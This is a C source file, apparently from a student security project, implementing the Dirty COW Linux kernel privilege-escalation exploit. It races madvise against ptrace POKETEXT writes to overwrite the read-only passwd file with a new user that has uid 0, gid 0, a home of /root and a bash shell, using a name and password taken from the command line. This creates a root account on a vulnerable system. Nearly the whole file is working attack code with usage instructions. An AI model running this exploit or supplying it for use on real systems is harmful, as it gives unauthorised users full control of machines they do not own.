/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   dirtycow.c                                         :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ciglesia <ciglesia@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/03/05 14:55:03 by ciglesia          #+#    #+#             */
/*   Updated: 2023/03/05 19:26:39 by ciglesia         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */
// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
// This exploit is based on the Christian "FireFart" Mehlmauer dirtycow adaptation.

#include "dirtycow.h"

int f;                                      // file descriptor
void *map;                                  // memory map
pid_t pid;                                  // process id
pthread_t pth;                              // thread
struct stat st;                             // file info

char *generate_password_hash(char *salt, char *plaintext_pw)
{
	return (crypt(plaintext_pw, salt));
}

char *generate_passwd_line(t_userinfo u)
{
	int size;
	char *ret;
	const char *format = "%s:%s:%d:%d:%s:%s:%s\n";

	size = snprintf(NULL, 0, format, u.username, u.hash,
					u.user_id, u.group_id, u.info, u.home_dir, u.shell);
	ret = malloc(size + 1);
	if (!ret)
		return (NULL);
	sprintf(ret, format, u.username, u.hash, u.user_id,
			u.group_id, u.info, u.home_dir, u.shell);
	return (ret);
}

int copy_file(const char *from, const char *to)
{
	char ch;
	int source;
	int target;

	if(access(to, F_OK) != -1)
	{
		printf("File %s already exists! Please delete it and run again\n", to);
		return (-1);
	}
	source = open(from, O_RDONLY);
	if (source == -1)
		return (-1);
	target = open(to, O_WRONLY | O_CREAT | O_TRUNC, 0666);
	if(target == -1) {
		close(source);
		return (-1);
	}
	while(read(source, &ch, 1) == 1)
		write(target, &ch, 1);
	printf("%s successfully backed up to %s\n", from, to);
	close(source);
	close(target);
	return (0);
}

void *madviseThread(void *arg)
{
	int i;
	int c;

	i = 0;
	c = 0;
	while (i < 200000000)
	{
		c += madvise(map, 100, MADV_DONTNEED);
		i++;
	}
	printf("madvise %d\n\n", c);
}

void	dirtycow(char *line_to_write)
{
	int u;
	int i;
	int o;
	int c;
	int l;

	printf("Opening read-only "PWDFILE"...\n");
	f = open(PWDFILE, O_RDONLY);
	if (f < 0)
	{
		perror("dirtycow");
		exit(1);
	}
	fstat(f, &st);
	map = mmap(NULL,
			   st.st_size + sizeof(long),   // file size + padding
			   PROT_READ,                   // read-only
			   MAP_PRIVATE,
			   f,
			   0
		);
	printf("mmap: %lx\n\e[?25l\n",(unsigned long)map);
	pid = fork();
	if (pid)
	{
		waitpid(pid, NULL, 0);
		i = 0;
		c = 0;
		l = strlen(line_to_write);
		while (i < 10000 / l)                    // 10k devided by l
		{
			o = 0;
			printf("Injecting memory [%.3d/%.3d]\r", i, (int)(10000 / l));
			fflush(stdout);
			while (o < l)                        // for each byte
			{
				u = 0;
				while (u < 10000)                // try 10K each time
				{
					c += ptrace(PTRACE_POKETEXT, // inject into memory
								pid,
								map + o,
								*((long*)(line_to_write + o)));
					u++;
				}
				o++;
			}
			i++;
		}
		printf("\e[?25h\nptrace %d\n",c);
	}
	else
	{
		pthread_create(&pth,
					   NULL,
					   madviseThread,
					   NULL);
		ptrace(PTRACE_TRACEME);
		kill(getpid(), SIGSTOP);
		pthread_join(pth,NULL);
	}
}

int main(int ac, char **av)
{
	t_userinfo user;
	char *line_to_write;

	if (ac == 3)
	{
		if (copy_file(PWDFILE, PWDBKP) != 0)
			return (1);
		user.username = av[1];
		user.user_id = 0;
		user.group_id = 0;
		user.info = "pwned";
		user.home_dir = "/root";
		user.shell = "/bin/bash";
		user.hash = generate_password_hash(av[1], av[2]);

		line_to_write = generate_passwd_line(user);

		printf("writing the line:\n%s\n", line_to_write);
		dirtycow(line_to_write);
	}
	else
		printf("Usage ./dirtycow <new username> <new password>\n");
	return (0);
}
